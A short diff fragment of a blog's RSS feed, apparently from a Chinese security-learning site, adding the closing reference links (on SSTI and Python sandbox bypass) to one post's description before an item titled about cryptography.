+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYnMuaWNodW5xaXUuY29tL3RocmVhZC00NzY4NS0xLTEuaHRtbA==&#34;&gt;浅析 SSTI (python 沙盒绕过)&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgxL2FydGljbGUvZGV0YWlscy8xMDY2MzkxMTE=&#34;&gt;https://blog.csdn.net/qq_45521281/article/details/106639111&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;附：读者可辅助参考的文章&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWHktLTEvcC8xMjg0MTk0MS5odG1s&#34;&gt;SSTI 学习&lt;/span&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;END&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">http://example.com/2021/10/23/CRYPTO%E2%80%94%E2%80%94%E5%AF%86%E7%A0%81%E7%9A%84%E5%8F%96%E7%BB%8F%E4%B9%8B%E8%B7%AF/</guid>
             <title>CRYPTO——密码的取经之路</title>
